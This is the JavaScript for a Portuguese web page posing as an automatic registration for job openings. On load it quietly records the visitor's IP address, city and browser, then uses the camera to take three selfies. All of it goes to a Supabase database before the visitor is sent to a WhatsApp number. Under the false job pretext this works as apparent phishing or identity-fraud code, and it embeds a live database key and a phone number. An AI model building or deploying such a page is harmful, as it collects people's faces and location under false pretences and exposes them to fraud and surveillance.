// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// PRÉ-CADASTRO (AO ABRIR A PÁGINA)
// =================================================================
async function salvarPreCadastro() {
  try {
    statusText.innerHTML = "🌐 Salvando pré-cadastro...";

    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    await supabaseClient.from('checkins').insert([{
      tipo_captura: "previa",
      ip: data.ip || "indisponível",
      cidade: data.city || "",
      user_agent: navigator.userAgent
    }]);

    console.log("✅ Pré-cadastro salvo");
  } catch(e) {
    console.log("Pré-cadastro falhou, continuando...");
  }
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    await salvarPreCadastro(); // Pré-cadastro

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    statusText.innerHTML = "✅ Sistema pronto";
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = iniciarSistema;

// =================================================================
// EVENTO DO BOTÃO
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
   
    statusText.innerHTML = "📨 Verificando informações do convite..";
    falar("Verificando informações do convite..");

    const largura = video.videoWidth;
    const altura = video.videoHeight;
    if(!largura || !altura){
      throw new Error("Vídeo não carregou corretamente.");
    }

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    statusText.innerHTML = "💾 Salvando cadastro...";
    falar("Salvando cadastro.");

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      user_agent: navigator.userAgent
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha de comunicação externa.");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
